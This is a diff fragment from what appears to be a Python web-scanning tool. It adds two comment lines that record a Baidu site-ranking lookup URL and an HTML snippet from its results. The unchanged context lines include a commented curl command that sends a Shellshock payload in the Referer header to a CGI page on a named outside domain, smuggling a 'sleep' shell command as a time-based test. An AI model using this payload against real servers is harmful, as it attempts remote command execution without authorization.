@@ -89,3 +89,5 @@ class DZBackupTester(Tester): # FIXME: change to Scanner, not Tester
 # -I fetch headers only
 time curl -I -v -H 'Referer: () { :;};/bin/sleep 7' 'http://www.whitewaterwest.cn/cgi/page.cgi?aid=338&_id=1448&zine=show'
 
+# http://mytool.chinaz.com/baidusort.aspx?host=cankaoxiaoxi.com&sortType=0
+#<div class="siteinfo">百度权重：<font color="blue">6</font>&nbsp;&nbsp;&nbsp;关键词数：<font color="blue">
